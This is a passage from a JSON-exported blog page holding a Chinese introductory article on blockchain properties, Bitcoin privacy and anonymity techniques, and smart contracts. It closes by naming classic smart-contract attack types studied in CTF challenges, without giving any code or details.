可以追溯</h3>\n<p>​\t\t在区块链中，每一个数据块都通过密码学算法计算和记录一段时间系统内全部信息交流的数据，并依据这些数据生成该数据块的指纹用于连接或生成下一个数据块并检验其信息的有效性。</p>\n<p>​\t\t如果修改一个区块的数据，这个区块便不被其他区块承认，而又因为其<strong>去中心化</strong>的特点，使得大规模修改区块数据十分困难，达到了<strong>不可篡改</strong>的效果。</p>\n<p>​\t\t区块链上每一个新区块的生成都包含了旧区块的信息，使得区块链储存了系统全部的历史数据，达到了<strong>全程留痕</strong>的效果。</p>\n<p>​\t\t区块链中的所有节点在每一个区块上都有一个时间戳，表示这个信息是这个时间写入的。又因其<strong>不可篡改</strong>的特点，使得区块链上每一条数据都可以通过链式结构追本溯源，验证其存在性，达到了<strong>可以追溯</strong>的特点。</p>\n<h3 id=\"集体维护\"><a class=\"anchor\" href=\"#集体维护\">#</a> 集体维护</h3>\n<p>​\t\t因为<strong>去中心化</strong>，区块链中的数据块由系统中所有具有维护功能的节点来共同维护，同时这些节点是开源的，任何人都可以参与。并且每一个节点在参与记录的同时也来验证其他节点记录结果的正确性，维护效率提高，成本降低。</p>\n<h3 id=\"公开透明隐私保护\"><a class=\"anchor\" href=\"#公开透明隐私保护\">#</a> 公开透明 / 隐私保护</h3>\n<p>​\t\t区块链中储存了系统全部的历史信息交流数据，并且<strong>可以追溯</strong>，使得区块链中的数据<strong>公开透明</strong>。</p>\n<p>​\t\t存储在区块链上的交易信息是公开的，但是账户身份信息是高度加密的。为了保护区块链中用户的隐私，BTC 通过隔断交易地址和地址持有人真实身份的关联（利用公钥哈希值作为交易标识），来达到匿名的效果，即知道有这笔交易，但不知道由谁交易给谁。但通过观察和跟踪区块链的信息，分析重复使用公钥哈希值和多次重复的 IP 信息，还是可以追查到帐户和交易的关联性，同时进行社工分析，就有可能被找出现实中的身份信息。</p>\n<p>​\t\t为了更好地保护隐私，基于加密算法，主要产生了以下四种加密方案：</p>\n<blockquote>\n<p>混币原理：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQjclQjclRTUlQjglODElRTYlOUMlOEQlRTUlOEElQTE=\">https://baike.baidu.com/item/ 混币服务</span></p>\n</blockquote>\n<blockquote>\n<p>环签名：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOEUlQUYlRTclQUQlQkUlRTUlOTAlOEQ=\">https://baike.baidu.com/item/ 环签名</span></p>\n</blockquote>\n<blockquote>\n<p>同态加密：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOTAlOEMlRTYlODAlODElRTUlOEElQTAlRTUlQUYlODY=\">https://baike.baidu.com/item/ 同态加密</span></p>\n</blockquote>\n<blockquote>\n<p>零知识证明（ZKP）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOUIlQjYlRTclOUYlQTUlRTglQUYlODYlRTglQUYlODElRTYlOTglOEU=\">https://baike.baidu.com/item/ 零知识证明</span></p>\n</blockquote>\n<h1 id=\"智能合约\"><a class=\"anchor\" href=\"#智能合约\">#</a> 智能合约</h1>\n<h2 id=\"概念定义-2\"><a class=\"anchor\" href=\"#概念定义-2\">#</a> 概念定义</h2>\n<blockquote>\n<p>​\t\t智能合约是一种旨在以信息化方式传播、验证或执行合同的计算机协议。智能合约允许在没有第三方的情况下进行可信交易，这些交易可追踪且不可逆转。</p>\n<p>​\t\t智能合约的目的是提供优于传统合约的安全方法，并减少与合约相关的其他交易成本。</p>\n</blockquote>\n<h2 id=\"数字形式\"><a class=\"anchor\" href=\"#数字形式\">#</a> 数字形式</h2>\n<blockquote>\n<p>数字形式意味着合约不得不写入计算机可读的代码中。</p>\n</blockquote>\n<p>​\t\t简单来讲，智能合约就是部署在区块链上的代码，而代码的执行则是在代码的执行是在本地的 EVM 中。本地的 EVM 读取了区块链上的代码，并在本地运行后，再将结果写入到区块链中。</p>\n<h2 id=\"智能合约的安全\"><a class=\"anchor\" href=\"#智能合约的安全\">#</a> 智能合约的安全</h2>\n<p>​\t\t既然智能合约的本质是能够运行的代码，那么相应的，它也会产生出一系列安全漏洞，并且大部分智能合约是开源的，剩余的小部分，也可以进行反编译，这使得智能合约的漏洞会更容易被找到。</p>\n<p>​\t\tPWN 中的智能合约题，便是利用合约代码中的漏洞，对合约进行攻击，从而达到获取 flag 的目的。</p>\n<p>​\t\t比较经典的攻击有：</p>\n<ul>\n<li>重入攻击</li>\n<li>整数溢出</li>\n<li>伪随机数回滚攻击</li>\n<li>薅羊毛（Airdrop Hunting）</li>\n<li>短地址攻击</li>\n<li>…………</li>\n</ul>\n",
            "tags": [
                "Blockchain"
            ]
        }
    ]
}